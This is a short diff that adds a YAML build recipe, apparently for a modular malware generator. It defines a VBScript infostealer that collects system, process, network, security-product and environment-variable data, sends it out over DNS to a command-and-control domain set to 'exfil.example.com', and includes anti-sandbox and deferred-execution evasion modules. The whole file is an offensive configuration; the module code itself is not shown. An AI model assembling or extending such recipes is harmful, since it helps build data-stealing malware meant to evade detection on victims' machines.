@@ -1,0 +1,25 @@
+name: vbs_infostealer_dns
+description: VBScript infostealer with DNS exfil for restricted environments
+format: vbscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+  - collectors/security_products
+  - collectors/env_vars
+
+exfil: exfil/dns_exfil
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/deferred_exec
+
+vars:
+  C2_DOMAIN: "exfil.example.com"
